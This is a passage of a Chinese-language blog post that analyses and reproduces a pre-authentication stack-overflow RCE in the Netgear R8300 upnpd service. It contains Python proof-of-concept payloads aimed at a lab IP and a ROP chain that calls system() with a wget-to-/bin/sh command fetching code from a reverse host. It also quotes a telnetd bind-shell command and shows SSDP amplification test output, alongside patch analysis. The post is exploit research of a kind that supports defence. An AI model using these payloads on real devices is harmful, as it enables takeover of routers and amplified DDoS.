+<p>很容易构造出可控 PC 的 payload，唯一需要注意的是栈上有个 v39 的指针 v41，覆盖的时候将其指向有效地址即可正常返回。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    0x604 * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x7e2da53c) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&apos;a&apos; +  # dummy</span><br><span class="line">    p32(0x43434343)  # LR</span><br><span class="line">)</span><br><span class="line">s.connect((&apos;192.168.2.2&apos;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/8e550952463f7fcff87e7b38b426c966492eb944" alt=""></p>
+<p>显然，<code>R4 - R11</code> 也是可控的，思考一下目前的情况：</p>
+<ol>
+<li>开了 NX 不能用 <code>shellcode</code>。</li>
+<li>有 ASLR，不能泄漏地址，不能使用各种 LIB 库中的符号和 <code>gadget</code>。</li>
+<li><code>strcpy()</code> 函数导致的溢出，payload 中不能包含 <code>\x00</code> 字符。</li>
+</ol>
+<p>其实可控 PC 后已经可以干很多事了，<code>upnpd</code> 内包含大量 <code>system</code> 函数调用，比如 <code>reboot</code>。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/1b93dd742804ca62c0228aae8d7b9114da416fe7" alt=""></p>
+<p>下面探讨下更为 general 的 RCE 利用，一般像这种 ROP 的 payload 中包含 <code>\x00</code>，覆盖返回地址的payload 又不能包含 <code>\x00</code>，就要想办法提前将 ROP payload 注入目标内存。</p>
+<p>比如，利用内存未初始化问题，构造如下 PoC，每个 payload 前添加 <code>\x00</code> 防止程序崩溃。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((&apos;192.168.2.2&apos;, 1900))</span><br><span class="line">s.send(b&apos;\x00&apos; + b&apos;A&apos; * 0x1ff0)</span><br><span class="line">s.send(b&apos;\x00&apos; + b&apos;B&apos; * 0x633)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>在漏洞点下断点，</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5b9c3c693161b7cfb17749bb0b30f0452a7e7404" alt=""></p>
+<p>两次拷贝完成后，看下内存布局：</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/c64d067ec6b990bb4329e81c163d35d1d001ea3e" alt=""></p>
+<p>可以看到，由于接收 socket 数据的 buffer 未初始化，在劫持 PC 前我们可以往目标内存注入 6500 多字节的数据。<br>这么大的空间，也足以给 ROP 的 payload 一片容身之地。</p>
+<p>借用原作者的一张图，利用原理如下：</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/331a5ac9fab5aa4f90c64fd195ccc065061ae950" alt=""></p>
+<p>关于 ROP，使用 <code>strcpy</code> 调用在 bss 上拼接出命令字符串，并调整 R0 指向这段内存，然后跳转 <code>system</code> 执行即可。</p>
+<p>原作者构造的 <code>system(&quot;telnetd -l /bin/sh -p 9999&amp; &quot;)</code> 绑定型 shell。</p>
+<p>经过分析，我发现可以构造 <code>system(&quot;wget http://{reverse_ip}:{reverse_port} -O-|/bin/sh&quot;)</code> 调用，从而无限制任意命令执行。</p>
+<p>构造的关键在于下面这张表。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/eee72b7b53f9845fc1f7074558a258d23191e753" alt=""></p>
+<p>发送 payload，通过 hook 的日志可以看到，ROP 利用链按照预期工作，可以无限制远程命令执行。<br>（由于模拟环境的问题，wget 命令运行段错误了…）</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/5da5d4d0c5612b8f83e5613435115328a06fda45" alt=""></p>
+<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>在更新版固件 <code>V1.0.2.134</code> 中，用 <code>strncpy()</code> 代替 <code>strcpy()</code>，限制了拷贝长度为 <code>0x5db</code>，正好是 buffer 长度减 1。</p>
+<p>补丁中还特意用 <code>memset()</code> 初始化了 buffer。这是由于 <code>strncpy()</code> 在拷贝时，如果 n &lt; src 的长度，只是将 src 的前 n 个字符复制到 dest 的前 n 个字符，不会自动添加 <code>\x00</code>，也就是结果 dest 不包括 <code>\x00</code>，需要再手动添加一个 <code>\x00</code>；如果 src 的长度小于 n 个字节，则以<code>\x00</code> 填充 dest 直到复制完 n 个字节。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/a36c0e6bceca8289f9169bc66d7cd08c35e4087a" alt=""></p>
+<p>结合上面的 RCE 利用过程，可见申请内存之后及时初始化是个很好的编码习惯，也能一定程度上避免很多安全问题。</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>通过 ZoomEye 网络空间搜索引擎对关键字 <code>&quot;SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0&quot;</code> 进行搜索，共发现 18889 条 Netgear UPnP 服务的 IP 历史记录，主要分布在美国<a href="https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22" title="ZoomEye 搜索" target="_blank" rel="noopener">【10】</a>。其中是 R8300 这个型号的会受到该漏洞影响。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/netgear_r8300_upnpd_preauth_rce/bdd0ce0d34d41a21ac3239a74a2d9fa2fa2b927b" alt=""></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>说句题外话，由于协议设计缺陷，历史上 UPnP 也被多次曝出漏洞，比如经典的 SSDP 反射放大用来 DDoS 的问题。</p>
+<p>在我们的模拟环境中进行测试，发送 132 bytes 的 <code>ST: ssdp:all M-SEARCH</code> 查询请求 ，服务器响应了 4063 bytes 的数据，放大倍率高达 30.8。</p>
+<p>因此，建议网络管理员禁止 SSDP UDP 1900 端口的入站请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">➜ pocsuite -r upnp_ssdp_ddos_poc.py -u 192.168.2.2 -v 2</span><br><span class="line"></span><br><span class="line">,------.                        ,--. ,--.       ,----.   &#123;1.5.9-nongit-20200408&#125;</span><br><span class="line">|  .--. &apos;,---. ,---.,---.,--.,--`--,-&apos;  &apos;-.,---.&apos;.-.  |</span><br><span class="line">|  &apos;--&apos; | .-. | .--(  .-&apos;|  ||  ,--&apos;-.  .-| .-. : .&apos; &lt;</span><br><span class="line">|  | --&apos;&apos; &apos;-&apos; \ `--.-&apos;  `&apos;  &apos;&apos;  |  | |  | \   --/&apos;-&apos;  |</span><br><span class="line">`--&apos;     `---&apos; `---`----&apos; `----&apos;`--&apos; `--&apos;  `----`----&apos;   http://pocsuite.org</span><br><span class="line">[*] starting at 11:05:18</span><br><span class="line"></span><br><span class="line">[11:05:18] [INFO] loading PoC script &apos;upnp_ssdp_ddos_poc.py&apos;</span><br><span class="line">[11:05:18] [INFO] pocsusite got a total of 1 tasks</span><br><span class="line">[11:05:18] [DEBUG] pocsuite will open 1 threads</span><br><span class="line">[11:05:18] [INFO] running poc:&apos;upnp ssdp ddos&apos; target &apos;192.168.2.2&apos;</span><br><span class="line"></span><br><span class="line">[11:05:28] [DEBUG] timed out</span><br><span class="line">[11:05:28] [DEBUG] HTTP/1.1 200 OK</span><br><span class="line">ST: upnp:rootdevice</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::upnp:rootdevice</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:InternetGatewayDevice:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:device:WANDevice:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:WANDevice:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:device:WANConnectionDevice:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:device:WANConnectionDevice:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:service:Layer3Forwarding:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:Layer3Forwarding:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de32-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:service:WANEthernetLinkConfig:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANEthernetLinkConfig:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:service:WANIPConnection:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANIPConnection:1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">ST: urn:schemas-upnp-org:service:WANPPPConnection:1</span><br><span class="line">LOCATION: http://192.168.2.2:5000/Public_UPNP_gatedesc.xml</span><br><span class="line">SERVER: Linux/2.6.12, UPnP/1.0, NETGEAR-UPNP/1.0</span><br><span class="line">EXT:</span><br><span class="line">CACHE-CONTROL: max-age=3600</span><br><span class="line">USN: uuid:6cbbc296-de42-bde2-3d68-5576da5933d1::urn:schemas-upnp-org:service:WANPPPConnection:1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[11:05:28] [+] URL : http://192.168.2.2</span><br><span class="line">[11:05:28] [+] Info : Send: 132 bytes, receive: 4063 bytes, amplification: 30.78030303030303</span><br><span class="line">[11:05:28] [INFO] Scan completed,ready to print</span><br><span class="line"></span><br><span class="line">+-------------+----------------+--------+-----------+---------+---------+</span><br><span class="line">| target-url  |    poc-name    | poc-id | component | version |  status |</span><br><span class="line">+-------------+----------------+--------+-----------+---------+---------+</span><br><span class="line">| 192.168.2.2 | upnp ssdp ddos |        |           |         | success |</span><br><span class="line">+-------------+----------------+--------+-----------+---------+---------+</span><br><span class="line">success : 1 / 1</span><br><span class="line"></span><br><span class="line">[*] shutting down at 11:05:28</span><br></pre></td></tr></table></figure>
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>【1】: Netgear 官方安全公告</p>
+<p><a href="https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211" target="_blank" rel="noopener">https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211</a></p>
+<p>【2】: 漏洞详情</p>
+<p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/</a></p>
+<p>【3】: NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞</p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-98253" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-98253</a></p>
+<p>【4】: Unlocking the Netgear Telnet Console</p>
+<p><a href="https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500" target="_blank" rel="noopener">https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500</a></p>
+<p>【5】: 固件下载</p>
+<p><a href="https://www.netgear.com/support/product/R8300.aspx#download" target="_blank" rel="noopener">https://www.netgear.com/support/product/R8300.aspx#download</a></p>
+<p>【6】: firmadyne</p>
+<p><a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p>
+<p>【7】: ARM-X</p>
+<p><a href="https://github.com/therealsaumil/armx" target="_blank" rel="noopener">https://github.com/therealsaumil/armx</a></p>
+<p>【8】: Vivotek 摄像头远程栈溢出漏洞分析及利用</p>
+<p><a href="https://paper.seebug.org/480/" target="_blank" rel="noopener">https://paper.seebug.org/480/</a></p>
+<p>【9】: nvram hook 库</p>
+<p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></p>
+<p>【10】: ZoomEye 搜索</p>
+<p><a href="https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22" target="_blank" rel="noopener">https://www.zoomeye.org/searchResult?q=%22SERVER%3A%20Linux%2F2.6.12%2C%20UPnP%2F1.0%2C%20NETGEAR-UPNP%2F1.0%22</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+
+
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 fenix 的个人博客">fenix</a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="https://0x43434343.com/2020/08/24/202008241640/" title="Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现</a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="https://0x43434343.com/2020/08/24/202008241640/" title="Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现">https://0x43434343.com/2020/08/24/202008241640/</a>
+        </li>
+
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2020年8月24日 - 16时08分
+        </li>  
+
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 fenix 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+
+      
+        <div class="post-tags">
+          
+            <a href="/tags/RCE/" rel="tag"># RCE</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+            <a href="/tags/Netgear-R8300/" rel="tag"># Netgear R8300</a>
+          
+            <a href="/tags/UPnP/" rel="tag"># UPnP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/28/202004281121/" rel="next" title="Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）">
+                <i class="fa fa-chevron-left"></i> Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/06/10/202106101731/" rel="prev" title="聊聊 Synology NAS Audio Station 套件未授权 RCE 调试及 EXP 构造">
+                聊聊 Synology NAS Audio Station 套件未授权 RCE 调试及 EXP 构造 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="fenix" />
+            
+              <p class="site-author-name" itemprop="name">fenix</p>
+              <p class="site-description motion-element" itemprop="description">愿得一人心，白首不分离。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/13ph03nix" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:abcnsxyz@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载固件"><span class="nav-number">2.1.</span> <span class="nav-text">下载固件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU-模拟"><span class="nav-number">2.2.</span> <span class="nav-text">QEMU 模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复运行依赖"><span class="nav-number">2.3.</span> <span class="nav-text">修复运行依赖</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用分析"><span class="nav-number">4.</span> <span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁分析"><span class="nav-number">5.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#影响范围"><span class="nav-number">6.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">7.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关链接"><span class="nav-number">8.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fenix</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">88.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
